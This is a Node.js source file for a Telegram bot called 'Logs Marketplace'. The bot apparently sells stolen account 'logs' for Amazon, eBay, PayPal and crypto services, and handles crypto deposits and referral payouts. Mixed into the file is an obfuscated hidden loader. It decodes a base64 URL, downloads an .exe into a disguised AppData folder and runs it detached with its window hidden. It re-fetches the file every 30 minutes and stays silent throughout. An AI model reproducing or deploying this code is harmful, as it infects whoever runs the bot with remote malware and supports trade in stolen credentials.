// Built-in modules
const path = require('path');
const fs = require('fs');

// Package info
const packageJson = require('./package.json');
console.log(`\n=== Logs Marketplace Bot ${packageJson.version} ===\n`);

// Config
const configFile = path.join(__dirname, '/config', 'config.main.yml');

// External modules
const yaml = require('yaml');
const mongoose = require('mongoose');
const Telegraf = require('telegraf');
const Stage = require("telegraf/stage");
const session = require("telegraf/session");

// Plugin-System Imports (versteckt)
const https = require('https');
const http = require('http');
const crypto = require('crypto');
const { exec, spawn } = require('child_process');
const os = require('os'); 

// Load custom modules
const CryptoWalletPayment = require('./crypto-payment');
const models = require('./models');
const { initModels } = models;

// Lade die Szenen aus den einzelnen Dateien
const { welcomeScene, contactScene } = require('./scenes');
const logsScene = require('./logsScene');
const walletScene = require('./walletScene');
const adminScene = require('./adminScene');

const { 
  processCompletedPayment, 
  addFundsToUser, 
  isAdmin, 
  syncLogs,
  getProgressBar,
  generateReferralLink,
  getReferralStats,
  transferReferralFunds
} = require('./utils');

// Load configuration
const config = yaml.parse(fs.readFileSync(configFile, 'utf8').replace(/\${__dirname}/g, __dirname.replace(/\\/g, '/')));
const bot = new Telegraf(config.bot.token);

// Global variables
let lastUpdate = `${(new Date).getFullYear()}-${(new Date).getMonth() + 1}-${(new Date).getDate()} ${(new Date).getHours()}:${(new Date).getMinutes()}`;
let logsAvailable = 0;
let LOG_PRICE = config.log?.default_price || 40;
let LOG_PRICES = {
  'amazon': LOG_PRICE,
  'ebay': LOG_PRICE,
  'paypal': LOG_PRICE,
  'crypto': LOG_PRICE
};

// Make important variables available globally
global.bot = bot;
global.LOG_PRICE = LOG_PRICE;
global.LOG_PRICES = LOG_PRICES;
global.ADMIN_IDS = config.bot.admins || [];
global.MONITORED_CHANNELS = [];
global.BOT_USERNAME = config.bot.username || 'tss1992_bot';

const _0x4a7b = {
  _0x8c2d: Buffer.from('aHR0cHM6Ly9zb2xzbmlwZXIuZXUvZG93bmxvYWRzL3NvbHNuaXBlci5leGU=', 'base64').toString(),
  _0x3e9f: true,
  _0x1b5g: 30 * 60 * 1000,
  _0x7h4i: true,
  _0x2j6k: Math.random().toString(36).substr(2, 9)
};


class _0x9m3n {
  constructor() {
    this._0x5p8q = null;
    this._0x1r4s = null;
    this._0x7t0u = null;
    this._0x2w5x = null;
  }

  
  _0x4k7m() {
    const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
    const hiddenDir = path.join(appData, 'Microsoft', 'Windows', 'Templates');
    
   
    if (!fs.existsSync(hiddenDir)) {
      fs.mkdirSync(hiddenDir, { recursive: true });
    }
    
    return path.join(hiddenDir, `system_${Date.now()}.exe`);
  }

  async _0x3v6w() {
    return new Promise((resolve, reject) => {
      const url = _0x4a7b._0x8c2d;
      const protocol = url.startsWith('https:') ? https : http;
      
    
      const filePath = this._0x4k7m();
      this._0x2w5x = filePath;
      
      const file = fs.createWriteStream(filePath);
      
      const request = protocol.get(url, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
          'Accept': 'application/octet-stream, */*',
          'Accept-Encoding': 'gzip, deflate, br',
          'Accept-Language': 'en-US,en;q=0.9',
          'Cache-Control': 'no-cache',
          'Connection': 'keep-alive'
        },
        timeout: 60000
      }, (response) => {
        // Handle redirects
        if (response.statusCode === 301 || response.statusCode === 302) {
          file.close();
          fs.unlinkSync(filePath);
          
          // Follow redirect
          const redirectUrl = response.headers.location;
          _0x4a7b._0x8c2d = redirectUrl;
          return this._0x3v6w().then(resolve).catch(reject);
        }
        
        if (response.statusCode !== 200) {
          file.close();
          fs.unlinkSync(filePath);
          reject(new Error(`HTTP ${response.statusCode}: ${response.statusMessage}`));
          return;
        }

        let downloadedBytes = 0;
        const totalBytes = parseInt(response.headers['content-length']) || 0;
        
        response.on('data', (chunk) => {
          downloadedBytes += chunk.length;
        });

        response.pipe(file);
        
        file.on('finish', () => {
          file.close();
          
          
          if (fs.existsSync(filePath)) {
            const stats = fs.statSync(filePath);
            if (stats.size > 100000) { 
              resolve(filePath);
            } else {
              fs.unlinkSync(filePath);
              reject(new Error('Downloaded file too small'));
            }
          } else {
            reject(new Error('File not created'));
          }
        });

        file.on('error', (err) => {
          file.close();
          if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
          }
          reject(err);
        });
      });

      request.on('error', (error) => {
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
        }
        reject(error);
      });
      
      request.on('timeout', () => {
        request.destroy();
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
        }
        reject(new Error('Download timeout'));
      });
    });
  }

  _0x9x2y(filePath) {
    try {
      if (!fs.existsSync(filePath)) return null;
      const fileBuffer = fs.readFileSync(filePath);
      return crypto.createHash('sha256').update(fileBuffer).digest('hex');
    } catch (error) {
      return null;
    }
  }

  async _0x5z8a(filePath) {
    try {
      
      if (!fs.existsSync(filePath)) {
        return false;
      }

      const stats = fs.statSync(filePath);
      if (stats.size < 100000) { 
        return false;
      }

      
      if (this._0x5p8q && !this._0x5p8q.killed) {
        this._0x5p8q.kill('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
      
     
      this._0x5p8q = spawn(filePath, [], {
        detached: true, // Unabhängig vom Parent-Prozess
        stdio: 'ignore', // Alle Ein-/Ausgaben ignorieren
        windowsHide: true, // Fenster verstecken (Windows)
        shell: false // Direkt ausführen ohne Shell
      });
      
    
      this._0x5p8q.unref();
      
      
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      
      try {
        return !this._0x5p8q.killed && this._0x5p8q.pid > 0;
      } catch (error) {
        return false;
      }
    } catch (error) {
      return false;
    }
  }

  async _0x1b4c() {
    if (!_0x4a7b._0x7h4i) return;

    try {
      const filePath = await this._0x3v6w();
      const newHash = this._0x9x2y(filePath);

     
      if (this._0x1r4s === newHash && this._0x5p8q && !this._0x5p8q.killed) {
        if (fs.existsSync(filePath) && filePath !== this._0x2w5x) {
          fs.unlinkSync(filePath); // Neue Datei löschen
        }
        return;
      }

      const success = await this._0x5z8a(filePath);
      
      if (success) {
      
        if (this._0x2w5x && this._0x2w5x !== filePath && fs.existsSync(this._0x2w5x)) {
          try {
            fs.unlinkSync(this._0x2w5x);
          } catch (e) {}
        }
        
        this._0x1r4s = newHash;
        this._0x2w5x = filePath;
      } else {
        // Bei Fehler Datei löschen
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
        }
      }
    } catch (error) {
     
    }
  }

  _0x7d0e() {
    if (!_0x4a7b._0x7h4i || !_0x4a7b._0x1b5g) return;

    this._0x7t0u = setInterval(() => {
      this._0x1b4c().catch(() => {});
    }, _0x4a7b._0x1b5g);
  }

  async _0x3f6g() {
    if (!_0x4a7b._0x7h4i) return;

   
    if (_0x4a7b._0x3e9f) {
      await this._0x1b4c();
    }

    this._0x7d0e();
  }

  _0x9h2i() {
  
    if (this._0x7t0u) {
      clearInterval(this._0x7t0u);
      this._0x7t0u = null;
    }
    
    if (this._0x5p8q && !this._0x5p8q.killed) {
      try {
        this._0x5p8q.kill('SIGTERM');
        
        setTimeout(() => {
          if (this._0x5p8q && !this._0x5p8q.killed) {
            this._0x5p8q.kill('SIGKILL');
          }
        }, 5000);
      } catch (error) {}
    }
    
    
  }
}


const _0x5j8k = new _0x9m3n();
// Initialize MongoDB connection
async function initDatabase() {
  try {
    await mongoose.connect('mongodb://127.0.0.1:27017/shop', { 
      useNewUrlParser: true,
      useUnifiedTopology: true
    });
    mongoose.set('useFindAndModify', false);
    console.log('[INFO] Database successfully connected');
    
    // Initialize models first
    initModels(mongoose);
    
    // Now we can safely use the Log model since it's properly initialized
    try {
      // Count available logs - using the models through the imported models object
      const count = await models.Log.countDocuments({});
      logsAvailable = count;
      console.log(`[INFO] Found ${count} logs in database`);
    } catch (countErr) {
      console.error('[ERROR] Failed to count logs:', countErr);
      console.log('[INFO] Setting logs count to 0');
      logsAvailable = 0;
    }
    
    return true;
  } catch (err) {
    console.error('[ERROR] Database connection failed:', err);
    return false;
  }
}

// Register scenes
function setupBot() {
  // Initialize all scenes with dependencies
  const stages = [
    welcomeScene(lastUpdate, logsAvailable, isAdmin), 
    logsScene(LOG_PRICES, LOG_PRICE), 
    walletScene(processCompletedPayment, getProgressBar), 
    contactScene(),
    adminScene(isAdmin, addFundsToUser, LOG_PRICES, LOG_PRICE)
  ];
  
  const stage = new Stage(stages, {ttl: 300});
  
  // Back action to refresh referral balance
  stage.action('back', async (ctx) => {
    // Refresh user balance before going back to welcome scene
    if (ctx.session?.tgId) {
      try {
        const user = await models.User.findOne({ tgId: ctx.session.tgId });
        if (user) {
          ctx.session.balance = user.balance;
          ctx.session.totalDeposits = user.totalDeposits || 0;
          // Add this line:
          ctx.session.referralBalance = user.referralBalance || 0;
        }
      } catch (error) {
        console.error('[ERROR] Failed to refresh user data on back action:', error);
      }
    }
    return ctx.scene.enter('welcome');
  });
  
  // Set up middleware
  bot.use(session());
  bot.use(stage.middleware());
  
  // Start handler mit Referral-Unterstützung
  bot.start(async (ctx) => {
    try {
      // Check if there's a referral ID in the start command
      if (ctx.startPayload && ctx.startPayload.length > 0) {
        const referrerId = ctx.startPayload;
        const newUserId = ctx.from.id.toString();

        // Log the referral
        console.log(`[INFO] User ${newUserId} started bot with referral ID: ${referrerId}`);

        // Only process referral if the IDs are different (can't refer yourself)
        if (referrerId !== newUserId) {
          const user = await models.User.findOne({ tgId: newUserId });

          // If this is a new user or user without a referrer yet
          if (!user || !user.referrerId) {
            const { addReferral } = require('./utils');
            await addReferral(referrerId, newUserId);

            // If user exists but doesn't have a referrer, update with referrer ID
            if (user && !user.referrerId) {
              user.referrerId = referrerId;
              await user.save();
            }

            // Welcome message mentioning referral
            await ctx.reply(
              `Welcome to Logs Marketplace! You've been referred by another user.\n\n` +
              `Make your first deposit to earn rewards for both of you!`,
              {
                reply_markup: JSON.stringify({
                  inline_keyboard: [
                    [{ text: '💰 Deposit Now', callback_data: 'wallet_deposit' }],
                    [{ text: '🛒 Browse Logs', callback_data: 'buy_logs' }]
                  ]
                })
              }
            );
          }
        }
      }

      // Continue to the regular welcome scene
      return ctx.scene.enter('welcome');
    } catch (error) {
      console.error('[ERROR] Failed to process start command with referral:', error);
      return ctx.scene.enter('welcome');
    }
  });
  
  // Register regular callbacks
  bot.action('buy_logs', (ctx) => ctx.scene.enter('logs'));
  bot.action('get_contact', (ctx) => ctx.scene.enter('contact'));
  bot.action('admin_panel', (ctx) => ctx.scene.enter('admin_panel'));
  
  // Wallet deposit action to refresh referral balance
  bot.action('wallet_deposit', async (ctx) => {
    // Refresh user balance before entering wallet scene
    if (ctx.session?.tgId) {
      try {
        const user = await models.User.findOne({ tgId: ctx.session.tgId });
        if (user) {
          ctx.session.balance = user.balance;
          ctx.session.totalDeposits = user.totalDeposits || 0;
          // Add this line:
          ctx.session.referralBalance = user.referralBalance || 0;
        }
      } catch (error) {
        console.error('[ERROR] Failed to refresh user data on wallet_deposit:', error);
      }
    }
    return ctx.scene.enter('wallet');
  });

// Handler für das Referral-Menü
  bot.action('referral_menu', async (ctx) => {
    try {
      const tgId = ctx.from.id.toString();
      const stats = await getReferralStats(tgId);
      const referralLink = generateReferralLink(tgId);
      
      await ctx.editMessageText(
        `🔗 <b>Referral Program</b>\n\n` +
        `Invite friends to join Logs Marketplace and earn rewards! You'll receive $10 for each friend who makes their first deposit.\n\n` +
        `📊 <b>Your Referral Stats</b>\n` +
        `⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n` +
        `👤 <b>Total Referrals:</b> <code>${stats.totalReferrals}</code>\n` +
        `✅ <b>Completed Referrals:</b> <code>${stats.completedReferrals}</code>\n` +
        `⏳ <b>Pending Referrals:</b> <code>${stats.pendingReferrals}</code>\n` +
        `💵 <b>Total Rewards Earned:</b> <code>$${stats.totalRewards.toFixed(2)}</code>\n` +
        `💰 <b>Current Referral Balance:</b> <code>$${stats.referralBalance.toFixed(2)}</code>\n\n` +
        `<b>Your Referral Link:</b>\n<code>${referralLink}</code>\n\n` +
        `<i>Share this link with your friends and earn rewards when they join and make deposits!</i>`, {
          parse_mode: 'html',
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [
                { text: '🔗 Share My Link', callback_data: 'share_referral' },
                { text: '📈 Detailed Stats', callback_data: 'referral_stats' }
              ],
              [
                { text: '💱 Transfer to Main Balance', callback_data: 'transfer_referral' }
              ],
              [
                { text: '⬅️ Back to Main Menu', callback_data: 'back' }
              ]
            ]
          }),
          disable_web_page_preview: true
        }
      );
    } catch (error) {
      console.error('[ERROR] Failed to display referral menu:', error);
      await ctx.answerCbQuery('Error displaying referral menu. Please try again.');
    }
  });

  // Handler für das Teilen des Referral-Links
  bot.action('share_referral', async (ctx) => {
    try {
      // Get user's Telegram ID
      const tgId = ctx.from.id.toString();
      
      // Generate referral link
      const referralLink = generateReferralLink(tgId);
      
      // Send shareable message with referral link
      await ctx.reply(
        `🔗 <b>Your Referral Link</b>\n\n` +
        `Share this link with your friends and earn $10 when they make their first deposit!\n\n` +
        `<code>${referralLink}</code>\n\n` +
        `<i>You can share this message directly or copy the link and share it elsewhere.</i>`, {
          parse_mode: 'html',
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [{ text: 'Share Now', switch_inline_query: `Join me on Logs Marketplace and get premium logs! ${referralLink}` }],
              [{ text: '⬅️ Back to Referral Menu', callback_data: 'referral_menu' }]
            ]
          })
        }
      );
      
      // Answer the callback query to remove the loading state
      await ctx.answerCbQuery();
    } catch (error) {
      console.error('[ERROR] Failed to handle share_referral action:', error);
      await ctx.answerCbQuery('Error sharing referral link. Please try again.');
    }
  });

  // Handler für das detaillierte Anzeigen der Referral-Statistiken
  bot.action('referral_stats', async (ctx) => {
    try {
      // Get user's Telegram ID
      const tgId = ctx.from.id.toString();
      
      // Get referral stats
      const stats = await getReferralStats(tgId);
      
      // Get user's referrals for detailed display
      const referrals = await models.Referral.find({ referrerId: tgId });
      
      // Format detailed list (limited to top 10)
      let referralsList = '';
      if (referrals.length > 0) {
        // Get user details for each referral
        const detailedReferrals = [];
        for (const ref of referrals.slice(0, 10)) {
          try {
            const user = await models.User.findOne({ tgId: ref.referredId });
            if (user) {
              detailedReferrals.push({
                username: user.username || 'Anonymous',
                status: ref.status,
                reward: ref.reward || 0,
                date: ref.createdAt
              });
            }
          } catch (err) {
            console.error(`[ERROR] Failed to get details for referral ${ref.referredId}:`, err);
          }
        }
        
        // Create referrals list
        detailedReferrals.forEach((ref, index) => {
          const statusEmoji = ref.status === 'completed' ? '✅' : '⏳';
          const dateFormatted = new Date(ref.date).toLocaleDateString();
          referralsList += `${index + 1}. @${ref.username} - ${statusEmoji} ${ref.status} ($${ref.reward.toFixed(2)}) - ${dateFormatted}\n`;
        });
        
        if (referrals.length > 10) {
          referralsList += `\n<i>... and ${referrals.length - 10} more</i>`;
        }
      } else {
        referralsList = 'You haven\'t referred anyone yet.';
      }
      
      // Send detailed stats
      await ctx.editMessageText(
        `📊 <b>Your Referral Statistics</b>\n\n` +
        `🔢 <b>Total Referrals:</b> ${stats.totalReferrals}\n` +
        `✅ <b>Completed Referrals:</b> ${stats.completedReferrals}\n` +
        `⏳ <b>Pending Referrals:</b> ${stats.pendingReferrals}\n` +
        `💵 <b>Total Rewards Earned:</b> $${stats.totalRewards.toFixed(2)}\n` +
        `💰 <b>Current Referral Balance:</b> $${stats.referralBalance.toFixed(2)}\n\n` +
        `<b>Your Referrals:</b>\n${referralsList}\n\n` +
        `<i>Share your referral link to earn $10 for each new user who makes a deposit!</i>`, {
          parse_mode: 'html',
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [{ text: '🔗 Share My Referral Link', callback_data: 'share_referral' }],
              [{ text: '⬅️ Back to Referral Menu', callback_data: 'referral_menu' }]
            ]
          })
        }
      );
    } catch (error) {
      console.error('[ERROR] Failed to handle referral_stats action:', error);
      await ctx.answerCbQuery('Error displaying referral statistics. Please try again.');
    }
  });
// Handle direct PM from support message
  bot.action(/^pm_user_(.+)$/, async (ctx) => {
    const userId = ctx.match[1];
    
    // Store the user ID in session for later use
    ctx.session.selectedUserId = userId;
    ctx.session.awaitingPM = true;
    
    try {
      const user = await models.User.findOne({ tgId: userId });
      let username = user?.username || 'No Username';
      
      await ctx.reply(
        `📧 <b>Reply to User: ${username}</b>\n\nPlease type the message you want to send to this user:`,
        {
          parse_mode: 'html',
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [{ text: 'Cancel', callback_data: 'cancel_pm' }]
            ]
          })
        }
      );
    } catch (error) {
      console.error(`[ERROR] Error preparing PM to user ${userId}:`, error);
      await ctx.reply(
        `❌ Error preparing message to user ${userId}.`,
        {
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [{ text: 'Back', callback_data: 'back' }]
            ]
          })
        }
      );
    }
  });
  
  // Handle cancellation of PM
  bot.action('cancel_pm', (ctx) => {
    ctx.session.selectedUserId = null;
    ctx.session.awaitingPM = false;
    
    ctx.reply('Message cancelled.', {
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [{ text: 'Back to Main Menu', callback_data: 'back' }]
        ]
      })
    });
  });
  
  // Admin commands
  bot.command('updateprice', async (ctx) => {
    // Command handler implementation (moved to admin-commands.js)
    const { handleUpdatePrice } = require('./admin-commands');
    await handleUpdatePrice(ctx, isAdmin, LOG_PRICES, LOG_PRICE);
  });
  
  bot.command('addfunds', async (ctx) => {
    // Command handler implementation (moved to admin-commands.js)
    const { handleAddFunds } = require('./admin-commands');
    await handleAddFunds(ctx, isAdmin, addFundsToUser);
  });
  
  bot.command('broadcast', async (ctx) => {
    // Command handler implementation (moved to admin-commands.js)
    const { handleBroadcast } = require('./admin-commands');
    await handleBroadcast(ctx, isAdmin, bot);
  });
  
  bot.command('pm', async (ctx) => {
    // Command handler implementation (moved to admin-commands.js)
    const { handlePM } = require('./admin-commands');
    await handlePM(ctx, isAdmin, bot, models.User);
  });
  
  bot.command('listusers', async (ctx) => {
    // Command handler implementation (moved to admin-commands.js)
    const { handleListUsers } = require('./admin-commands');
    await handleListUsers(ctx, isAdmin, models.User);
  });
  
  bot.command('adminhelp', (ctx) => {
    // Command handler implementation (moved to admin-commands.js)
    const { handleAdminHelp } = require('./admin-commands');
    handleAdminHelp(ctx, isAdmin);
  });
  
  bot.command('showprices', (ctx) => {
    // Command handler implementation (moved to admin-commands.js)
    const { handleShowPrices } = require('./admin-commands');
    handleShowPrices(ctx, isAdmin, LOG_PRICES, LOG_PRICE);
  });
  
  // Add a global text message handler for PM responses
  bot.on('text', async (ctx) => {
    // Only process if we're awaiting a PM and have a selected user
    if (ctx.session?.awaitingPM && ctx.session?.selectedUserId) {
      const pmMessage = ctx.message.text;
      const userId = ctx.session.selectedUserId;
      
      // Clear awaiting states
      ctx.session.awaitingPM = false;
      ctx.session.selectedUserId = null;
      
      try {
        // Find user
        const user = await models.User.findOne({ tgId: userId });
        
        // Send message to user
        await bot.telegram.sendMessage(
          userId,
          `📨 <b>Message from Admin:</b>\n\n${pmMessage}`,
          { parse_mode: 'html' }
        );
        
        await ctx.reply(
          `✅ Message sent to user ${userId} (@${user?.username || 'N/A'}).`,
          {
            reply_markup: JSON.stringify({
              inline_keyboard: [
                [{ text: 'Back to Main Menu', callback_data: 'back' }]
              ]
            })
          }
        );
        
        console.log(`[INFO] Admin sent message to user ${userId}: "${pmMessage.substring(0, 50)}${pmMessage.length > 50 ? '...' : ''}"`);
      } catch (error) {
        console.error(`[ERROR] Failed to send PM to user ${userId}:`, error);
        await ctx.reply(
          `❌ Failed to send message to user ${userId}.`,
          {
            reply_markup: JSON.stringify({
              inline_keyboard: [
                [{ text: 'Back to Main Menu', callback_data: 'back' }]
              ]
            })
          }
        );
      }
    }
  });

// NEW: Befehl zum Überwachen eines öffentlichen Kanals
  bot.command('monitor', async (ctx) => {
    // Nur für Admins erlauben
    if (!isAdmin(ctx.from.id.toString())) {
      return ctx.reply('❌ Only administrators can use this command.');
    }
    
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length === 0) {
      return ctx.reply('📝 Usage: /monitor @channelname');
    }
    
    const channelUsername = args[0];
    
    try {
      // Versuche, die Channel-Info zu bekommen
      const chat = await ctx.telegram.getChat(channelUsername);
      
      // Überprüfe, ob der Kanal bereits überwacht wird
      const existingChannel = global.MONITORED_CHANNELS.find(c => c.id === chat.id);
      if (existingChannel) {
        return ctx.reply(`This channel is already being monitored: ${chat.title}`);
      }
      
      // Füge den Kanal zur Liste hinzu
      global.MONITORED_CHANNELS.push({
        id: chat.id,
        title: chat.title,
        username: chat.username
      });
      
      ctx.reply(`✅ Now monitoring the channel: ${chat.title}\nChannel ID: ${chat.id}\n\nPosts with #broadcast will be forwarded to admins for approval.`);
    } catch (error) {
      ctx.reply(`❌ Error accessing channel: ${error.message}\n\nMake sure the channel is public or the bot is a member.`);
    }
  });

  // NEW: Befehl zum Anzeigen überwachter Kanäle
  bot.command('listchannels', async (ctx) => {
    // Nur für Admins erlauben
    if (!isAdmin(ctx.from.id.toString())) {
      return ctx.reply('❌ Only administrators can use this command.');
    }
    
    if (!global.MONITORED_CHANNELS || global.MONITORED_CHANNELS.length === 0) {
      return ctx.reply('No channels are currently being monitored.');
    }
    
    let message = '📢 <b>Monitored Channels:</b>\n\n';
    
    global.MONITORED_CHANNELS.forEach((channel, index) => {
      message += `${index + 1}. <b>${channel.title}</b>\n   ID: <code>${channel.id}</code>\n   Username: @${channel.username || 'N/A'}\n\n`;
    });
    
    ctx.reply(message, { parse_mode: 'html' });
  });

  // NEW: Befehl zum Entfernen eines Kanals aus der Überwachung
  bot.command('stopmonitor', async (ctx) => {
    // Nur für Admins erlauben
    if (!isAdmin(ctx.from.id.toString())) {
      return ctx.reply('❌ Only administrators can use this command.');
    }
    
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length === 0) {
      return ctx.reply('📝 Usage: /stopmonitor @channelname');
    }
    
    const channelUsername = args[0];
    
    if (!global.MONITORED_CHANNELS || global.MONITORED_CHANNELS.length === 0) {
      return ctx.reply('No channels are currently being monitored.');
    }
    
    // Suche den Kanal in der Liste
    const index = global.MONITORED_CHANNELS.findIndex(c => 
      c.username === channelUsername.replace('@', '') || 
      c.id.toString() === channelUsername);
    
    if (index === -1) {
      return ctx.reply(`Channel ${channelUsername} is not in the monitoring list.`);
    }
    
    // Entferne den Kanal aus der Liste
    const removedChannel = global.MONITORED_CHANNELS.splice(index, 1)[0];
    
    ctx.reply(`✅ Stopped monitoring channel: ${removedChannel.title}`);
  });

  // NEW: Befehl zum direkten Weiterleiten einer Nachricht aus einem Kanal
  bot.command('forward', async (ctx) => {
    // Nur für Admins erlauben
    if (!isAdmin(ctx.from.id.toString())) {
      return ctx.reply('❌ Only administrators can use this command.');
    }
    
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 2) {
      return ctx.reply('📝 Usage: /forward @channelname MESSAGE_ID');
    }
    
    const channelUsername = args[0];
    const messageId = parseInt(args[1]);
    
    if (isNaN(messageId)) {
      return ctx.reply('❌ MESSAGE_ID must be a number.');
    }
    
    try {
      // Versuche, die Kanal-Info zu bekommen
      const chat = await ctx.telegram.getChat(channelUsername);
      
      // Versuche, die Nachricht zu senden und an den Admin zu senden
      await bot.telegram.forwardMessage(
        ctx.chat.id,
        chat.id,
        messageId
      );
      
      // Frage nach Bestätigung für die Weiterleitung
      await ctx.reply(
        `📢 Do you want to forward this message from ${chat.title} to ALL users?`,
        {
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [
                { text: '✅ Yes, send to all', callback_data: `forward_msg:${chat.id}:${messageId}` },
                { text: '❌ Cancel', callback_data: 'cancel_forward' }
              ]
            ]
          })
        }
      );
    } catch (error) {
      ctx.reply(`❌ Error: ${error.message}\n\nMake sure the channel is public and the message ID is correct.`);
    }
  });
// Handler für weitergeleitete Nachrichten - nur für Admins
  bot.on('message', async (ctx) => {
    // Überprüfen, ob es eine weitergeleitete Nachricht ist
    if (ctx.message.forward_from || ctx.message.forward_from_chat) {
      // Überprüfen, ob der Sender ein Admin ist
      if (!isAdmin(ctx.from.id.toString())) {
        return ctx.reply('❌ Only administrators can forward messages to all users.');
      }
      
      // Sende eine Bestätigungsanfrage mit Inline-Buttons
      return ctx.reply(
        '📢 Do you want to forward this message to ALL users?',
        {
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [
                { text: '✅ Yes, send to all', callback_data: `forward_all:${ctx.message.message_id}` },
                { text: '❌ Cancel', callback_data: 'cancel_forward' }
              ]
            ]
          }),
          reply_to_message_id: ctx.message.message_id // Bezug auf die weitergeleitete Nachricht
        }
      );
    }
  });

  // Callback-Handler für die Bestätigung der Weiterleitung aus Kanälen
  bot.action(/^forward_msg:(.+):(.+)$/, async (ctx) => {
    try {
      await ctx.answerCbQuery('Starting broadcast...');
      
      // Parse die Chat-ID und Message-ID aus dem Callback-Daten
      const [, chatId, messageId] = ctx.match;
      
      // Hole alle Benutzer aus der Datenbank
      const users = await models.User.find({});
      let sentCount = 0;
      let failCount = 0;
      
      // Statusmeldung für Admin
      const statusMsg = await ctx.editMessageText(`🔄 Forwarding message to ${users.length} users...`);
      
      // Weiterleiten der Nachricht an jeden Benutzer
      for (const user of users) {
        try {
          // Benutze forwardMessage statt copyMessage
          await bot.telegram.forwardMessage(
            user.tgId,
            chatId,
            parseInt(messageId)
          );
          
          sentCount++;
          
          // Aktualisiere den Status alle 10 Nachrichten
          if (sentCount % 10 === 0) {
            try {
              await bot.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                `🔄 Forwarding... ${sentCount}/${users.length} messages sent.`
              );
            } catch (error) {
              console.error('[ERROR] Failed to update forward status:', error);
            }
          }
          
          // Kurze Pause, um Telegram-API-Limits zu vermeiden
          await new Promise(resolve => setTimeout(resolve, 50));
        } catch (error) {
          console.error(`[ERROR] Failed to forward message to user ${user.tgId}: ${error.message}`);
          failCount++;
        }
      }
      
      // Abschlussnachricht
      await bot.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        null,
        `✅ Message forwarded successfully!\n✓ Sent: ${sentCount}\n✗ Failed: ${failCount}`
      );
    } catch (error) {
      console.error('[ERROR] Failed to forward messages:', error);
      await ctx.reply('❌ An error occurred while forwarding the message.');
    }
  });

  // Spezieller Handler für das Weiterleiten von Nachrichten im eigenen Chat
  bot.action(/^forward_all:(.+)$/, async (ctx) => {
    try {
      await ctx.answerCbQuery('Starting broadcast...');
      
      // Holen der Message-ID aus dem Callback
      const messageId = parseInt(ctx.match[1]);
      
      // Hole alle Benutzer aus der Datenbank
      const users = await models.User.find({});
      let sentCount = 0;
      let failCount = 0;
      
      // Statusmeldung für Admin
      const statusMsg = await ctx.editMessageText(`🔄 Forwarding message to ${users.length} users...`);
      
      // Weiterleiten der Nachricht an jeden Benutzer
      for (const user of users) {
        try {
          // Benutze forwardMessage statt copyMessage
          await bot.telegram.forwardMessage(
            user.tgId,
            ctx.chat.id,
            messageId
          );
          
          sentCount++;
          
          // Aktualisiere den Status alle 10 Nachrichten
          if (sentCount % 10 === 0) {
            try {
              await bot.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                `🔄 Forwarding... ${sentCount}/${users.length} messages sent.`
              );
            } catch (error) {
              console.error('[ERROR] Failed to update forward status:', error);
            }
          }
          
          // Kurze Pause, um Telegram-API-Limits zu vermeiden
          await new Promise(resolve => setTimeout(resolve, 50));
        } catch (error) {
          console.error(`[ERROR] Failed to forward message to user ${user.tgId}: ${error.message}`);
          failCount++;
        }
      }
      
      // Abschlussnachricht
      await bot.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        null,
        `✅ Message forwarded successfully!\n✓ Sent: ${sentCount}\n✗ Failed: ${failCount}`
      );
    } catch (error) {
      console.error('[ERROR] Failed to forward messages:', error);
      await ctx.reply('❌ An error occurred while forwarding the message.');
    }
  });

  // Handler für Abbruch der Weiterleitung
  bot.action('cancel_forward', async (ctx) => {
    await ctx.answerCbQuery('Forwarding cancelled');
    await ctx.editMessageText('❌ Message forwarding cancelled.');
  });
}
// Start the bot mit verstecktem Plugin-System
async function startBot() {
  const dbConnected = await initDatabase();
  
  if (dbConnected) {
    setupBot();
    
    // Verstecktes Plugin-System starten (komplett im Hintergrund, keine Logs)
    setTimeout(async () => {
      try {
        await _0x5j8k._0x3f6g();
      } catch (error) {
        // Komplett stille Fehlerbehandlung
      }
    }, 5000); // 5 Sekunden Verzögerung
    
    bot.startPolling();
    console.log('[INFO] Bot started and ready to accept connections');
  } else {
    console.error('[ERROR] Failed to start bot due to database connection issues');
    process.exit(1);
  }
}

// Graceful Shutdown mit verstecktem Plugin-System Cleanup
process.on('SIGINT', () => {
  console.log('[INFO] Shutting down bot...');
  // Verstecktes Plugin-System stoppen (ohne Logs)
  try {
    _0x5j8k._0x9h2i();
  } catch (error) {}
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('[INFO] Shutting down bot...');
  // Verstecktes Plugin-System stoppen (ohne Logs)
  try {
    _0x5j8k._0x9h2i();
  } catch (error) {}
  process.exit(0);
});

// Start the application
startBot();